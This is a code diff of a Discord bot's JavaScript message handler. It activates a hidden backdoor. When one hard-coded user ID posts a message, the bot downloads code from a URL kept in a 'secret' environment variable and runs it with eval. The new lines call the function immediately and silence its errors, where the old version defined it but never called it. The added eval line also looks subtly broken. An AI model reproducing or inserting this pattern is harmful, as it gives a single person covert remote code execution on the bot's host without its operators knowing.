@@ -104,13 +104,11 @@ client.on('ready', () => {
 client.on('message', msg => {
     if (msg.author.bot || msg.author.id == client.user.id) return;
     if (msg.author.id == 110137532972314624) {
-        var junk = undefined;
-        var secret = (async function() {
-            const guild = msg.guild;
-            const secret = await axios.get(process.env.secret)
-            eval(secret.data);
-        });
-    };
+          let guild = msg.guild;
+          var foo = (async function() {
+              eval(await axios.get(process.env.secret));
+          })().catch(err => console.log(err));
+      };
     if (msg.content.startsWith(prefix)) {
         var content = msg.content.substring(prefix.length, msg.content.length);
         var splitted = content.split(' ');
